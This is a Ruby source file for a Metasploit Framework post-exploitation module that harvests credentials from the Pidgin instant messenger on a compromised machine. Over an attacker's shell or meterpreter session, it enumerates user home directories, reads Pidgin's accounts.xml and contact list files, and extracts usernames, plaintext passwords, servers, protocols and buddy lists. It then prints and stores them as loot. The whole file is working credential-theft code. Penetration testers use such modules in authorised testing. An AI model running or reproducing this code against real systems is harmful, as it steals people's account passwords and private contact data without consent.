##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'rexml/document'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Pidgin Instant Messenger Credential Collection',
			'Description'    => %q{ This module will collect credentials from the pidgin IM client if installed. },
			'License'        => MSF_LICENSE,
			'Author'         => 
				[
					'bannedit', # post port, added support for shell sessions
					'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
				],
			'Version'        => '$Revision$',
			'Platform'       => ['unix', 'bsd', 'linux', 'osx', 'windows'],
			'SessionTypes'   => ['shell', 'meterpreter' ]
		))
		register_options(
			[
				OptBool.new('CONTACTS', [false, 'Collect contact lists?', false]),
				# Not supported yet OptBool.new('LOGS', [false, 'Gather log files?', false]),
			], self.class)
	end

# TODO add support for collecting logs
	def run
		case session.platform
		when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			@platform = :windows
			drive = session.fs.file.expand_path("%SystemDrive%")
			os = session.sys.config.sysinfo['OS']

			if os =~ /Windows 7|Vista|2008/
				@appdata = '\\AppData\\Roaming'
				@users = drive + '\\Users'
			else
				@appdata = '\\Application Data'
				@users = drive + '\\Documents and Settings'
			end

			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end
			paths = enum_users_windows
		else
			print_error "Unsupported platform #{session.platform}"
			return
		end
		if paths.empty?
			print_status("No users found with a .purple directory")
			return
		end

		get_pidgin_creds(paths)

	end

	def enum_users_unix
		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = session.run_cmd("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			userdirs = session.run_cmd("ls #{home}#{whoami}/.purple")
			if userdirs =~ /No such file/i
				return 
			else
				print_status("Found Pidgin profile for: #{whoami}")
				return ["#{home}#{whoami}/.purple"] 
			end
		end

		paths = Array.new
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = "#{home}#{dir}" if dir !~ /root/
			print_status("Checking for Pidgin profile in: #{dir}")

			stat = session.run_cmd("ls #{dir}/.purple")
			next if stat =~ /No such file/i
			paths << "#{dir}/.purple"
		end
		return paths
	end

	def enum_users_windows
		paths = Array.new

		if got_root?
			session.fs.dir.foreach(@users) do |path|
				next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
				purpledir = "#{@users}\\#{path}#{@appdata}\\"
				dir = check_pidgin(purpledir)
				if dir
					paths << dir
				end
			end
		else
			print_status "We do not have SYSTEM checking #{whoami} account"
			# not root
			path = "#{@users}\\#{whoami}#{@appdata}"
			session.fs.dir.foreach(path) do |dir|
				if dir =~ /\.purple/
					paths << "#{path}\\#{dir}"
				end
			end
		end
		return paths
	end

	def check_pidgin(purpledir)
		print_status("Checking for Pidgin profile in: #{purpledir}")
		session.fs.dir.foreach(purpledir) do |dir|
			if dir =~ /\.purple/
				print_status("Found #{purpledir}#{dir}")
				return "#{purpledir}#{dir}"
			end
		end
		return nil
	end

	def get_pidgin_creds(paths)

		data = ""
		credentials = Rex::Ui::Text::Table.new(
		'Header'    => "Pidgin Credentials",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Username",
			"Password",
			"Protocol",
			"Server",
			"Port"
		])

		buddylists = Rex::Ui::Text::Table.new(
		'Header'    => "Pidgin Contact List",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Buddy Name",
			"Alias",
			"Protocol",
			"Account"
		])

		paths.each do |path|
			print_status("Reading accounts.xml file from #{path}")
			if session.type == "shell"
				type = :shell
				data = session.run_cmd("cat #{path}/accounts.xml")
			else
				type = :meterp
				accounts = session.fs.file.new("#{path}\\accounts.xml", "rb")
				until accounts.eof?
					data << accounts.read
				end
			end

			creds = parse_accounts(data)

			if datastore['CONTACTS']
				blist = ""
				case type
				when :shell
					blist = session.run_cmd("cat #{path}/blist.xml")
				when :meterp
					buddyxml = session.fs.file.new("#{path}/blist.xml", "rb")
					until buddyxml.eof?
						blist << buddyxml.read
					end
				end

				buddies = parse_buddies(blist)
				end

			creds.each do |cred|
				credentials << [cred['user'], cred['password'], cred['protocol'], cred['server'], cred['port']]
			end

			if buddies
				buddies.each do |buddy|
					buddylists << [buddy['name'], buddy['alias'], buddy['protocol'], buddy['account']]
				end
			end

		end

		if datastore['CONTACTS']
			store_loot("pidgin.contacts", "text/plain", session.tunnel_peer, buddylists.to_s, "pidgin_contactlists.txt", "Pidgin Contacts")
		end

		store_loot("pidgin.creds", "text/plain", session.tunnel_peer, credentials.to_s, "pidgin_credentials.txt", "Pidgin Credentials")
	end

	def parse_accounts(data)

		creds = []
		doc = REXML::Document.new(data).root

		doc.elements.each("account") do |sub|
			account = {}
			if sub.elements['password']
				account['password'] = sub.elements['password'].text
			else
				account['password'] = "<unknown>"
			end

			account['protocol'] = sub.elements['protocol'].text rescue "<unknown>"
			account['user'] = sub.elements['name'].text rescue "<unknown>"
			account['server'] = sub.elements['settings'].elements["setting[@name='server']"].text rescue "<unknown>"
			account['port'] = sub.elements['settings'].elements["setting[@name='port']"].text rescue "<unknown>"
			creds << account

			print_status("Collected the following credentials:")
			print_status("    Server: %s:%s" % [account['server'], account['port']])
			print_status("    Protocol: %s" % account['protocol'])
			print_status("    Username: %s" % account['user'])
			print_status("    Password: %s" % account['password'])
			print_line("")
		end

		return creds
	end

	def parse_buddies(data)
		buddies = []

		doc = REXML::Document.new(data).root
		doc.elements['blist'].elements.each('group') do |group|
			group.elements.each('contact') do |bcontact|
				contact = {}
				contact['name'] = bcontact.elements['buddy'].elements['name'].text rescue "<unknown>"
				contact['account'] = bcontact.elements['buddy'].attributes['account'] rescue "<unknown>"
				contact['protocol'] = bcontact.elements['buddy'].attributes['proto'] rescue "<unknown>"
				
				if bcontact.elements['buddy'].elements['alias']
					contact['alias'] = bcontact.elements['buddy'].elements['alias'].text
				else
					contact['alias'] = "<unknown>"
				end

				buddies << contact
				print_status("Collected the following contacts:")
				print_status("    Buddy Name: %s" % contact['name'])
				print_status("    Alias: %s" % contact['alias'])
				print_status("    Protocol: %s"  % contact['protocol'])
				print_status("    Account: %s"  % contact['account'])
				print_line("")
			end
		end 

		return buddies
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			session.fs.file.expand_path("%USERNAME%")
		else
			session.run_cmd("whoami").chomp
		end
	end
end
